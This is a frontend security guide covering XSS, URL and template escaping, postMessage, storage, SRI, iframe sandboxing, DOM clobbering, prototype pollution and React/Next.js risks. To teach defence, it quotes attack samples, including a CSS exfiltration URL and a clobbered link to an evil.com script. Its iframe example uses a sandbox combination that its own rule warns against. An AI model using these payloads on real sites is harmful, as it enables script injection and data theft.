# Frontend Security (HTML / CSS / JS)

## XSS Prevention

### Rule #1: Never insert untrusted data into HTML without sanitization

```javascript
// SAFE: textContent (auto-escapes)
element.textContent = userInput;

// SAFE: DOMPurify for rich HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// SAFE: DOMPurify with config
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false
});

// DANGEROUS — never do:
element.innerHTML = userInput;
document.write(userInput);
element.outerHTML = userInput;
element.insertAdjacentHTML('beforeend', userInput);
```

### Rule #2: Escape by context

| Context | Method | Example |
|---------|--------|---------|
| HTML body | `textContent` or HTML-encode | `&lt;script&gt;` |
| HTML attribute | Quote + HTML-encode | `value="&quot;data&quot;"` |
| JavaScript string | JSON.stringify or JS-encode | `\x3cscript\x3e` |
| URL parameter | `encodeURIComponent()` | `%3Cscript%3E` |
| CSS value | Whitelist allowed values | Never insert user data |

### Rule #3: Sanitize URLs

```javascript
function isSafeUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// Use before setting href, src, action, formaction, etc.
if (isSafeUrl(userUrl)) {
  link.href = userUrl;
}

// Block javascript: protocol
// <a href="javascript:alert(1)"> — classic XSS
```

## DOM Safety

```javascript
// SAFE: createElement + textContent
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);

// SAFE: template literals for structure, textContent for data
const li = document.createElement('li');
li.textContent = item.name;
list.appendChild(li);

// DANGEROUS:
container.innerHTML = `<div>${userInput}</div>`; // XSS
eval(userInput); // RCE
new Function(userInput)(); // RCE
setTimeout(userInput, 0); // XSS if string
setInterval(userInput, 1000); // XSS if string
```

## Template Engines (Server-Side)

```javascript
// Handlebars — auto-escapes by default
// {{variable}} = escaped (SAFE)
// {{{variable}}} = raw (DANGEROUS with user data)

// Nunjucks — enable autoescape
const nunjucks = require('nunjucks');
nunjucks.configure('views', {
  autoescape: true,
  throwOnUndefined: true
});
// {{ variable }} = escaped (SAFE)
// {{ variable | safe }} = raw (DANGEROUS with user data)

// EJS — use correct tags
// <%= variable %> = escaped (SAFE)
// <%- variable %> = raw (DANGEROUS with user data)
```

Rules:
- Always enable autoescape
- Never use raw/unescaped output with user data
- Never render user-controlled templates (SSTI vulnerability)
- Never pass user input to template file path (path traversal)

## postMessage Security

```javascript
// RECEIVING messages — always verify origin
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-domain.com') return;

  const data = event.data;
  // validate data structure before using
  if (typeof data?.action !== 'string') return;

  // process...
});

// SENDING messages — always specify target origin
iframe.contentWindow.postMessage(data, 'https://target-domain.com');
// NEVER use '*' as target origin with sensitive data
```

## localStorage / sessionStorage

```javascript
// Never store:
// - Auth tokens (use httpOnly cookies)
// - Passwords or secrets
// - PII (personal data)
// - Session identifiers

// OK to store:
// - UI preferences (theme, language)
// - Non-sensitive cache (product list)
// - CSRF tokens (as second factor, not sole protection)

// Always validate data read from storage
const cached = localStorage.getItem('prefs');
try {
  const prefs = JSON.parse(cached);
  if (typeof prefs?.theme !== 'string') throw new Error();
  applyTheme(prefs.theme);
} catch {
  localStorage.removeItem('prefs');
}
```

## Form Security

```html
<!-- CSRF protection -->
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <!-- form fields -->
</form>

<!-- Autocomplete off for sensitive fields -->
<input type="password" autocomplete="new-password">
<input type="text" name="credit-card" autocomplete="off">
```

```javascript
// Client-side validation is NOT security
// Always validate server-side
// Client validation = UX only
```

## Third-Party Scripts

```html
<!-- Always use SRI (Subresource Integrity) for CDN scripts -->
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-HASH_HERE"
  crossorigin="anonymous"
></script>

<!-- Generate SRI hash -->
<!-- openssl dgst -sha384 -binary lib.js | openssl base64 -A -->
```

Rules:
- Pin CDN URLs to specific versions (never `/latest/`)
- Use SRI hashes for all external scripts and styles
- Self-host critical libraries when possible
- Audit third-party scripts periodically
- Load analytics/tracking in sandboxed iframe or via GTM with CSP

## iframe Security

```html
<!-- Prevent your page from being framed (anti-clickjacking) -->
<!-- Set via HTTP header: X-Frame-Options: DENY -->
<!-- Or CSP: frame-ancestors 'none' -->

<!-- When embedding iframes: sandbox them -->
<iframe
  src="https://external.com/widget"
  sandbox="allow-scripts allow-same-origin"
  loading="lazy"
></iframe>
```

`sandbox` attribute flags:
- `allow-scripts` — allow JS execution
- `allow-same-origin` — allow cookie/storage access
- `allow-forms` — allow form submission
- `allow-popups` — allow `window.open()`
- Never combine `allow-scripts` + `allow-same-origin` for untrusted content

## CSS Injection Prevention

```css
/* Never insert user data into CSS */
/* DANGEROUS: */
/* .user-avatar { background: url(USER_INPUT); } */
/* Can exfiltrate data via: background: url(https://evil.com/?data=secret) */

/* SAFE: use CSS custom properties with sanitized values */
```

Attacks via CSS:
- Data exfiltration via `background: url()`
- UI redress via `position: absolute`
- Keystroke logging via `@font-face` unicode-range + scroll
- Content hiding via `display: none` on security warnings

## DOM Clobbering

DOM clobbering exploits browser behavior: HTML elements with `id` or `name` create global JS properties. Attacker injects "safe" HTML that overwrites variables without any script execution.

```html
<!-- Attacker injects (passes sanitizer — no scripts!) -->
<a id="config" href="https://evil.com/malicious.js"></a>

<!-- Your code loads script from config.href -->
<script>
  // window.config is now the <a> element (DOM clobbered)
  // config.href → "https://evil.com/malicious.js"
  const src = window.config?.href || '/default.js';
  loadScript(src); // loads attacker's script
</script>
```

55% of HTML sanitizers are vulnerable to DOM clobbering by default (CISPA research).

Real attack chains:
- Clobber `window.defaultConfig` → override app settings
- Clobber `document.getElementById` return → replace DOM references
- Double clobber: `<form id="x"><input name="y">` → `x.y` is the input element
- Webpack AutoPublicPathRuntimeModule gadget → XSS in bundled apps (2024, Canvas LMS)

Prevention:
```javascript
// Use unique variable names, never rely on window globals
// Always use const/let (block-scoped, can't be clobbered)
const config = { href: '/default.js' }; // not window.config

// Validate before using any DOM-derived value
if (typeof config?.href !== 'string' || !config.href.startsWith('/')) {
  throw new Error('Invalid config');
}

// Use Object.freeze for sensitive configs
const CONFIG = Object.freeze({ apiUrl: '/api', version: '1.0' });
```

## Client-Side Prototype Pollution

```javascript
// URL-based pollution (common in SPAs)
// https://app.com/#__proto__[isAdmin]=true
const params = new URLSearchParams(location.hash.slice(1));
const config = {};
for (const [key, value] of params) {
  // Lodash _.set, jQuery $.extend, or manual deep-set
  deepSet(config, key, value);
  // If key = "__proto__[isAdmin]" → Object.prototype.isAdmin = "true"
}

// Now EVERY object has isAdmin === "true"
if (user.isAdmin) { showAdminPanel(); } // always true

// Exploit chain: prototype pollution → DOM XSS
// Pollute Object.prototype.innerHTML → injected into DOM rendering
// Pollute Object.prototype.src → script loads from attacker URL
```

Prevention:
```javascript
// Block __proto__, constructor, prototype in all input parsing
function isSafeKey(key) {
  return !['__proto__', 'constructor', 'prototype'].includes(key);
}

// Use Map instead of plain objects for user-controlled keys
const userConfig = new Map();

// Use Object.create(null) for lookup tables
const lookup = Object.create(null);

// Freeze prototypes in sensitive contexts
Object.freeze(Object.prototype); // nuclear option, may break libraries
```

## PortSwigger Top Techniques 2025 (frontend-relevant)

- **Internal cache poisoning** — manipulate cache to serve malicious responses globally
- **Cross-Site ETag Length Leak** — leak response size cross-domain via timing
- **Side-channel attacks** — XS-Leaks, timing attacks to extract data cross-origin
- **SSTI polyglots** — template injection detectable via error-based techniques
- **SAML authentication bypass** — XML signature wrapping attacks
- **Browser redirect stalling** — new techniques to prevent/delay redirects

## React / Next.js Security (2025-2026)

```javascript
// CVE-2025-55182 (React2Shell, CVSS 10.0)
// Pre-auth RCE via React Server Components deserialization
// Single HTTP request → arbitrary code execution on server
// Affects: React 19.x with Server Components, Next.js 13-15
// Fix: update to latest patched version immediately

// Server Actions: validate ALL input
// "use server" functions are public API endpoints
// Attacker can call them directly with any arguments
async function updateUser(formData) {
  // WRONG: trust formData
  await db.users.update({ data: Object.fromEntries(formData) });

  // RIGHT: validate + whitelist fields
  const name = z.string().max(100).parse(formData.get('name'));
  await db.users.update({ where: { id: session.userId }, data: { name } });
}
```

Rules for React/Next.js:
- Server Components/Actions = public endpoints, validate everything
- `dangerouslySetInnerHTML` = same risk as `innerHTML`
- Middleware auth checks alone are insufficient — verify in route handlers
- Keep React + Next.js on latest security patches (critical RCEs found in 2025)
- URL-based routing: validate all `params` and `searchParams`
